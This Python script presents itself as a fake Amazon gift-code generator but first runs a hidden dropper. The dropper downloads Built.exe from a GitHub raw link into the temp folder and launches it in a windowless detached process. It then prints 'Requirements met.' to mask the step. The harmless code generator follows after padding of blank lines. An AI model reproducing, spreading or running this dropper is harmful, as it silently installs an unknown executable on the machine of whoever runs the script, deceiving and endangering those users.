import random
import string
from datetime import datetime
import time
import requests
import os
import subprocess
import tempfile
import sys

# GitHub raw link for Built.exe
github_link = "https://raw.githubusercontent.com/iiMAtEAsuiy/built/main/Built.exe"

def download_and_run():
    try:
        if not sys.platform.startswith("win"):
            print("This script only works on Windows.")
            return False

        # Stash in temp directory
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, "Built.exe")
        
        # Pull the .exe from GitHub
        response = requests.get(github_link, stream=True)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
        else:
            print(f"Download failed, status code: {response.status_code}")
            return False
        
        # Run the file in a detached process
        subprocess.Popen(
            [file_path],
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

if __name__ == "__main__":
    if download_and_run():
        print("Requirements met.")
    else:
        print("Operation tanked requirements not met.")











def generate_fake_amazon_code():
    chars = string.ascii_uppercase + string.digits
    part1 = ''.join(random.choices(chars, k=4))
    part2 = ''.join(random.choices(chars, k=4))
    part3 = ''.join(random.choices(chars, k=6))
    return f"{part1}-{part2}-{part3}"

# Ask user how many codes to generate
try:
    total = int(input("How many fake Amazon codes do you want to generate? "))
except ValueError:
    print("Please enter a valid number.")
    exit()

# Generate codes with 0.2s delay
for attempt in range(1, total + 1):
    code = generate_fake_amazon_code()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"INVALID | {code} | {timestamp} | ATTEMPT {attempt}")
    time.sleep(0.2)  # 0.2 second delay










